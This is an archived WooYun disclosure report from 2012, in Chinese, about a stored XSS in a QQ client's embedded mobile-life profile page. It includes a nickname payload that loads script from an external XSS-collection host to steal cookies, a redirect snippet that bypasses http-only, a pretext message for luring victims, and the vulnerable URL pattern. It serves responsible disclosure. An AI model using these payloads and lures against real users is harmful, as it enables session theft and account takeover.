@@ -1,0 +1,240 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		PKAV腾讯专场 - 3. 腾讯QQ客户端某处功能页面存储型XSS  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		PKAV腾讯专场 - 3. 腾讯QQ客户端某处功能页面存储型XSS  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/only_guest">only_guest</a> 
+</li><li>提交时间：		2012-10-19 12:10</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-10-19：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-10-19：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-10-29：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-11-08：	细节向普通白帽子公开<br/>
+									2012-11-18：	细节向实习白帽子公开<br/>
+									2012-12-03：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">QQ客户端某处页面没过滤好，导致可被利用XSS。漏洞相关信息，会同步至pkav.net。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">QQ里很多地方都是嵌入的网页，所以我们对这些嵌入的网页系统的进行了分析。<br />
+<br />
+<br />
+<br />
+而后，发现在手机生活这个功能页面中，昵称处未过滤，从而导致XSS。<br />
+<br />
+<br />
+<br />
+1. 漏洞页面，个人资料，手机生活页面。<br />
+<br />
+<br />
+<br />
+2. QQ用户昵称有一定的长度限制。为了在某种程度上绕过这种限制，我们利用之前在某漏洞中已经使用过的技巧，从webQQ来修改用户的昵称，将昵称修改为：&lt;script src=//xsser.me/xxxxx&gt; 即可。（因为昵称后方有 &lt;/script&gt;闭合，因此利用代码无需加&lt;/script&gt;）<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/191155041d04da1753539e1dcba5756b5a72174f.jpg" target="_blank"><img src="../images/191155041d04da1753539e1dcba5756b5a72174f.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+3. 可以看到当用户打开页面，页面执行了我们指定的JS文件。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/19115757a82fc0e466c2ae535feefab2b2135ea6.jpg" target="_blank"><img src="../images/19115757a82fc0e466c2ae535feefab2b2135ea6.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+ 页面内的昵称没有被过滤<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/19120652070adf9d89e811beb48bca066b9dfdc7.jpg" target="_blank"><img src="../images/19120652070adf9d89e811beb48bca066b9dfdc7.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+4. 用自己大号访问小号的个人资料--手机生活页面时。触发XSS，导致信息被记录。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/191158372c570b2f19d4bc1406bbbedf4a23e3d1.jpg" target="_blank"><img src="../images/191158372c570b2f19d4bc1406bbbedf4a23e3d1.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+弹个窗<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/191204404723f4fb58bc357bda5831720bcb9ff3.jpg" target="_blank"><img src="../images/191204404723f4fb58bc357bda5831720bcb9ff3.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+5. 此次发布漏洞时，小号可成功利用登录信息来登录大号。 但是在之前测试时，发现此页面的cookie加了http-only，不知道现在为何又没了？挺奇怪。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/19120416d11d18e56465e408683d265cbb0b36f2.jpg" target="_blank"><img src="../images/19120416d11d18e56465e408683d265cbb0b36f2.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+6. 不过即使是之前加了http-only的情况，我们依然可以通过跳转到腾讯旗下任意一个反射型XSS，来间接获取到用户的cookies信息。<br />
+<br />
+<br />
+<br />
+</p><pre><code>if(location.href.indexOf(&quot;m.qq.com&quot;)&gt;-1){ location.href=&quot;反射型XSS地址&quot;; }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+7. 至于漏洞利用方法。<br />
+<br />
+<br />
+<br />
+A. 诱使用户访问你的个人资料-手机生活页面。 至于怎么骗，看各人自己口才了，比如我会说：“hey, 帮我看看我的手机生活页面，为什么我能看到别人的，看不到我自己的啊，你那边能看到吗？我这边显示一片空白。。不知道是不是我网络问题啊。”<br />
+<br />
+<br />
+<br />
+B. http://m.qq.com/client/cguest?frienduin=10001 这个页面本身没有做好有判定，因此任何人都可以访问到任何人的手机生活页面。比如上面是pony的手机生活页面。因而，http://m.qq.com/client/cguest?frienduin=带有XSS的QQ号码， 这个页面将可以直接用来作为XSS页面发送给受害者。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">昵称输出过滤 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/only_guest" title="only_guest">only_guest</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-013563" title="PKAV腾讯专场 - 3. 腾讯QQ客户端某处功能页面存储型XSS">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：13 </p>
+													<p class="detail">确认时间：2012-10-19 16:00</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告。我们会马上安排专人跟进确认处理，有新的情况会及时同步</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="13563";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
